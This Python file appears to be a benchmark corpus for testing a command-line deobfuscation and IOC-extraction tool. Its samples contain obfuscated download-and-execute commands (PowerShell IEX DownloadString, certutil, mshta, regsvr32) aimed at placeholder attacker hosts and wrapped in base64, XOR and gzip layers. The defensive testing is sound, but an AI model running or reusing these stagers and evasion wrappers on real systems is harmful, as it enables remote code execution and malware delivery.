"""RC2.3 Chain-Completeness Benchmark corpus.

Each sample is a real-world (or realistic synthetic) obfuscated commandline.
Kept in code (not JSONL) so the fixtures survive `git blame` review and edits
don't corrupt escape sequences.

Sample schema
-------------
{
    "id":               unique short id (kebab-case)
    "category":         Base64 | XOR | PowerShell | CMD | LOLBAS | Compression |
                        Phishing | Loader | Multi-Stage | Benign | Regression
    "input":            the payload to feed into orchestrator
    "expected_terms":   list of substrings that MUST appear in the final decoded
                        output for the chain to count as "complete"
    "must_extract":     dict of IOC kind → list of expected values
                        (e.g. {"urls": [...], "ips": [...]})
    "expected_verdict": "malicious" | "suspicious" | "needs_review" |
                        "benign" | "unknown"  (soft; failure downgrades to
                        precision score, not chain-completeness)
    "notes":            free-form
}

The benchmark reports:
  * decode_depth:   how many layers fired
  * complete:       all `expected_terms` present in final output
  * time_ms:        wall time
  * terminal:       orchestrator stop reason
  * confidence:     final risk_score
  * false_ioc:      IOCs extracted that weren't in `must_extract`
"""
from __future__ import annotations

import base64
import gzip

# ------------------------------------------------------------------ #
# Helpers to synthesize test payloads with predictable ground truth
# ------------------------------------------------------------------ #
def _b64(s: bytes) -> str:
    return base64.b64encode(s).decode("ascii")


def _b64_str(s: str) -> str:
    return _b64(s.encode("utf-8"))


def _double_b64(s: str) -> str:
    return _b64_str(_b64_str(s))


def _gzip_b64(s: str) -> str:
    return _b64(gzip.compress(s.encode("utf-8")))


def _xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def _xor_b64(s: str, key: bytes) -> str:
    return _b64(_xor_bytes(s.encode("utf-8"), key))


def _utf16le_b64(s: str) -> str:
    return _b64(s.encode("utf-16-le"))


# ------------------------------------------------------------------ #
# Corpus — 25 curated samples across the categories
# ------------------------------------------------------------------ #
SAMPLES = [
    # ── BASE64 (simple + nested) ──────────────────────────────────
    {
        "id": "b64-single-cmd",
        "category": "Base64",
        "input": _b64_str("cmd.exe /c whoami && systeminfo"),
        "expected_terms": ["cmd.exe", "whoami", "systeminfo"],
        "must_extract": {},
        "expected_verdict": "needs_review",
        "notes": "single-layer base64",
    },
    {
        "id": "b64-double-ps",
        "category": "Base64",
        "input": _double_b64(
            "powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/x.ps1')"
        ),
        "expected_terms": ["powershell", "DownloadString", "http://evil.example.com/x.ps1"],
        "must_extract": {"urls": ["http://evil.example.com/x.ps1"]},
        "expected_verdict": "malicious",
        "notes": "double-nested base64 with LOLBAS + URL",
    },
    {
        "id": "b64-utf16le-ps-encodedcommand",
        "category": "PowerShell",
        "input": _utf16le_b64(
            "IEX (New-Object Net.WebClient).DownloadString('http://c2.example.com/loader.ps1')"
        ),
        "expected_terms": ["IEX", "DownloadString", "http://c2.example.com/loader.ps1"],
        "must_extract": {"urls": ["http://c2.example.com/loader.ps1"]},
        "expected_verdict": "malicious",
        "notes": "canonical -EncodedCommand pattern (base64 of UTF-16LE)",
    },

    # ── XOR chains ────────────────────────────────────────────────
    {
        "id": "xor-1byte-b64",
        "category": "XOR",
        "input": _b64(_xor_bytes(
            b"cmd.exe /c certutil -urlcache -f http://malc2.example.net/x.exe drop.exe" * 2,
            b"\x2a",
        )),
        "expected_terms": ["cmd.exe", "certutil", "http://malc2.example.net/x.exe"],
        "must_extract": {"urls": ["http://malc2.example.net/x.exe"]},
        "expected_verdict": "malicious",
        "notes": "single-byte XOR after base64 — canonical Meterpreter tail",
    },
    {
        "id": "xor-5byte-b64",
        "category": "XOR",
        "input": _b64(_xor_bytes(
            (b"powershell.exe -nop -w hidden -c IEX((New-Object Net.WebClient)"
             b".DownloadString('http://evil.example.com/loader.ps1'))") * 3,
            b"K3yPs",
        )),
        "expected_terms": ["powershell", "DownloadString"],
        "must_extract": {"urls": ["http://evil.example.com/loader.ps1"]},
        "expected_verdict": "malicious",
        "notes": "5-byte repeating XOR key",
    },
    {
        "id": "xor-7byte-b64",
        "category": "XOR",
        "input": _b64(_xor_bytes(
            (b"cmd.exe /c certutil -urlcache -split -f "
             b"http://malc2.example.net/payload.dat drop.exe && drop.exe\n") * 3,
            b"S3v3nBt",
        )),
        "expected_terms": ["certutil", "urlcache"],
        "must_extract": {"urls": ["http://malc2.example.net/payload.dat"]},
        "expected_verdict": "malicious",
        "notes": "7-byte repeating XOR key",
    },
    {
        "id": "xor-11byte-b64",
        "category": "XOR",
        "input": _b64(_xor_bytes(
            (b"powershell.exe -NoP -NonI -W Hidden -c \"& { "
             b"IEX ((New-Object Net.WebClient).DownloadString('http://c2.evil.net/stage2.ps1')); "
             b"Start-Sleep 60 }\"") * 4,
            b"BlueOcto999",
        )),
        "expected_terms": ["powershell", "DownloadString"],
        "must_extract": {"urls": ["http://c2.evil.net/stage2.ps1"]},
        "expected_verdict": "malicious",
        "notes": "11-byte repeating XOR — currently likely to fail (>8 byte)",
    },

    # ── GZIP + Base64 ─────────────────────────────────────────────
    {
        "id": "gzip-b64-loader",
        "category": "Compression",
        "input": _gzip_b64(
            "powershell.exe -c \"IEX ((New-Object Net.WebClient)"
            ".DownloadString('http://phish.example.org/stage2.ps1'))\""
        ),
        "expected_terms": ["powershell", "DownloadString", "phish.example.org"],
        "must_extract": {"urls": ["http://phish.example.org/stage2.ps1"]},
        "expected_verdict": "malicious",
        "notes": "base64(gzip(script)) — Empire framework pattern",
    },
    {
        "id": "gzip-b64-xor-tail",
        "category": "Multi-Stage",
        "input": _b64(_xor_bytes(
            gzip.compress(
                b"cmd.exe /c mshta http://mal.example.io/loader.hta && exit"
            ),
            b"\x5c",
        )),
        "expected_terms": ["mshta", "http://mal.example.io/loader.hta"],
        "must_extract": {"urls": ["http://mal.example.io/loader.hta"]},
        "expected_verdict": "malicious",
        "notes": "base64(xor(gzip(cmd))) — 3-layer chain",
    },

    # ── PowerShell obfuscation ────────────────────────────────────
    {
        "id": "ps-char-decimal",
        "category": "PowerShell",
        "input": (
            "$s = [char]73+[char]69+[char]88+[char]40+[char]39+[char]104+[char]116"
            "+[char]116+[char]112+[char]58+[char]47+[char]47+[char]98+[char]97+"
            "[char]100+[char]46+[char]99+[char]111+[char]109+[char]39+[char]41; & $s"
        ),
        "expected_terms": ["IEX", "http://bad.com"],
        "must_extract": {},
        "expected_verdict": "suspicious",
        "notes": "[char] decimal reconstruction — needs Phase A6",
    },
    {
        "id": "ps-char-hex",
        "category": "PowerShell",
        "input": (
            "$c = [char]0x49+[char]0x45+[char]0x58; & $c "
            "(iwr http://drop.example.net/p.ps1).Content"
        ),
        "expected_terms": ["IEX", "http://drop.example.net/p.ps1"],
        "must_extract": {"urls": ["http://drop.example.net/p.ps1"]},
        "expected_verdict": "suspicious",
        "notes": "[char]0xNN hex reconstruction",
    },
    {
        "id": "ps-join-obfuscation",
        "category": "PowerShell",
        "input": "$a = ('I','E','X') -join ''; & $a (New-Object Net.WebClient).DownloadString('http://c2.local/s.ps1')",
        "expected_terms": ["IEX", "http://c2.local/s.ps1"],
        "must_extract": {"urls": ["http://c2.local/s.ps1"]},
        "expected_verdict": "suspicious",
        "notes": "-join '' reconstruction",
    },
    {
        "id": "ps-format-operator",
        "category": "PowerShell",
        "input": '"{2}{0}{1}" -f "E","X","I"',
        "expected_terms": ["IEX"],
        "must_extract": {},
        "expected_verdict": "unknown",
        "notes": "-f format operator reconstruction",
    },
    {
        "id": "ps-replace-obfuscation",
        "category": "PowerShell",
        "input": "('IZZEZZX').Replace('ZZ','')",
        "expected_terms": ["IEX"],
        "must_extract": {},
        "expected_verdict": "unknown",
        "notes": ".Replace() call",
    },

    # ── CMD obfuscation ────────────────────────────────────────────
    {
        "id": "cmd-env-var",
        "category": "CMD",
        "input": "cmd.exe /c %SystemRoot%\\System32\\certutil.exe -urlcache -f http://cmd-c2.example.org/z.exe %TEMP%\\z.exe",
        "expected_terms": ["certutil", "http://cmd-c2.example.org/z.exe"],
        "must_extract": {"urls": ["http://cmd-c2.example.org/z.exe"]},
        "expected_verdict": "malicious",
        "notes": "%VAR% expansion",
    },
    {
        "id": "cmd-set-and-call",
        "category": "CMD",
        "input": "set U=powershell&& set X=IEX && %U% %X% (iwr http://payload.example.net/x.ps1)",
        "expected_terms": ["powershell", "IEX", "http://payload.example.net/x.ps1"],
        "must_extract": {"urls": ["http://payload.example.net/x.ps1"]},
        "expected_verdict": "suspicious",
        "notes": "SET then %VAR% reference — CMD reconstruction needed",
    },
    {
        "id": "cmd-delayed-expansion",
        "category": "CMD",
        "input": "cmd.exe /V:ON /c \"set A=cert&& set B=util&& !A!!B!.exe -urlcache -f http://mal.io/x.exe drop.exe\"",
        "expected_terms": ["certutil", "http://mal.io/x.exe"],
        "must_extract": {"urls": ["http://mal.io/x.exe"]},
        "expected_verdict": "malicious",
        "notes": "!DELAYED! expansion",
    },

    # ── LOLBAS download chains ─────────────────────────────────────
    {
        "id": "lolbas-certutil-download",
        "category": "LOLBAS",
        "input": "cmd.exe /c certutil.exe -urlcache -split -f http://drop.example.com/x.exe drop.exe && drop.exe",
        "expected_terms": ["certutil", "drop.example.com"],
        "must_extract": {"urls": ["http://drop.example.com/x.exe"]},
        "expected_verdict": "malicious",
        "notes": "plaintext certutil download",
    },
    {
        "id": "lolbas-mshta-remote",
        "category": "LOLBAS",
        "input": "mshta.exe http://mal.example.io/loader.hta",
        "expected_terms": ["mshta", "http://mal.example.io/loader.hta"],
        "must_extract": {"urls": ["http://mal.example.io/loader.hta"]},
        "expected_verdict": "malicious",
        "notes": "mshta remote HTA execution",
    },
    {
        "id": "lolbas-regsvr32-remote",
        "category": "LOLBAS",
        "input": "regsvr32 /s /n /u /i:http://sct.example.io/x.sct scrobj.dll",
        "expected_terms": ["regsvr32", "http://sct.example.io/x.sct"],
        "must_extract": {"urls": ["http://sct.example.io/x.sct"]},
        "expected_verdict": "malicious",
        "notes": "Squiblydoo — regsvr32 scrobj.dll pattern",
    },

    # ── Phishing / real-world ─────────────────────────────────────
    {
        "id": "phish-onenote-lure",
        "category": "Phishing",
        "input": (
            "powershell -w hidden -c \"$u='http://phish.example.com/invoice.pdf'; "
            "iwr $u -o $env:TEMP\\invoice.pdf; start $env:TEMP\\invoice.pdf\""
        ),
        "expected_terms": ["powershell", "phish.example.com"],
        "must_extract": {"urls": ["http://phish.example.com/invoice.pdf"]},
        "expected_verdict": "suspicious",
        "notes": "phishing → download → open lure PDF",
    },

    # ── Benign administrative commands ────────────────────────────
    {
        "id": "benign-whoami",
        "category": "Benign",
        "input": "whoami /all",
        "expected_terms": ["whoami"],
        "must_extract": {},
        "expected_verdict": "unknown",
        "notes": "benign admin — must NOT be flagged malicious",
    },
    {
        "id": "benign-git-status",
        "category": "Benign",
        "input": "git status --porcelain",
        "expected_terms": ["git", "status"],
        "must_extract": {},
        "expected_verdict": "unknown",
        "notes": "benign devops",
    },
    {
        "id": "benign-scheduled-task-list",
        "category": "Benign",
        "input": "schtasks /query /fo LIST",
        "expected_terms": ["schtasks"],
        "must_extract": {},
        "expected_verdict": "unknown",
        "notes": "benign task listing",
    },

    # ── Regression samples (previously partial-decode failures) ───
    {
        "id": "regression-meterpreter-tail-garbage",
        "category": "Regression",
        "input": _b64(_xor_bytes(
            b"powershell.exe -nop -w hidden -e IEX ((New-Object Net.WebClient)"
            b".DownloadString('http://tail.example.io/p.ps1'))\n\x00\x03\x81\x91" * 2,
            b"K3yPs",
        )),
        "expected_terms": ["powershell", "DownloadString"],
        "must_extract": {"urls": ["http://tail.example.io/p.ps1"]},
        "expected_verdict": "malicious",
        "notes": "residual binary tail — tests tail-trim + normalizer",
    },
    {
        "id": "regression-nested-b64-nulls",
        "category": "Regression",
        "input": _b64_str(_b64_str("cmd.exe /c echo test\x00\x00\x00\x00")),
        "expected_terms": ["cmd.exe", "echo", "test"],
        "must_extract": {},
        "expected_verdict": "unknown",
        "notes": "nested base64 with trailing nulls — tests normalization re-loop",
    },

    # ── JavaScript (Phase B — expected to fail on baseline) ──────
    {
        "id": "js-fromcharcode",
        "category": "JavaScript",
        "input": "eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))",
        "expected_terms": ["alert", "xss"],
        "must_extract": {},
        "expected_verdict": "suspicious",
        "notes": "String.fromCharCode -> eval — Phase B target",
    },
    {
        "id": "js-atob",
        "category": "JavaScript",
        "input": "eval(atob('YWxlcnQoJ3B3bmVkJyk='))",
        "expected_terms": ["alert", "pwned"],
        "must_extract": {},
        "expected_verdict": "suspicious",
        "notes": "atob() base64 wrapper — Phase B",
    },
    {
        "id": "js-unescape",
        "category": "JavaScript",
        "input": "eval(unescape('%61%6c%65%72%74%28%31%29'))",
        "expected_terms": ["alert"],
        "must_extract": {},
        "expected_verdict": "suspicious",
        "notes": "unescape() URL-hex — Phase B",
    },

    # ── VBScript (Phase B — expected to fail on baseline) ─────────
    {
        "id": "vbs-chr",
        "category": "VBScript",
        "input": "Execute(Chr(77) & Chr(115) & Chr(103) & Chr(66) & Chr(111) & Chr(120) & \"(\\\"pwned\\\")\")",
        "expected_terms": ["MsgBox", "pwned"],
        "must_extract": {},
        "expected_verdict": "suspicious",
        "notes": "Chr() + Execute — Phase B",
    },
    {
        "id": "vbs-createobject",
        "category": "VBScript",
        "input": "CreateObject(\"WScript.Shell\").Run \"cmd.exe /c calc.exe\"",
        "expected_terms": ["WScript.Shell", "cmd.exe"],
        "must_extract": {},
        "expected_verdict": "suspicious",
        "notes": "CreateObject + Run — Phase B",
    },
]


def by_category() -> dict:
    """Group samples by category → useful for reporting."""
    out: dict = {}
    for s in SAMPLES:
        out.setdefault(s["category"], []).append(s)
    return out
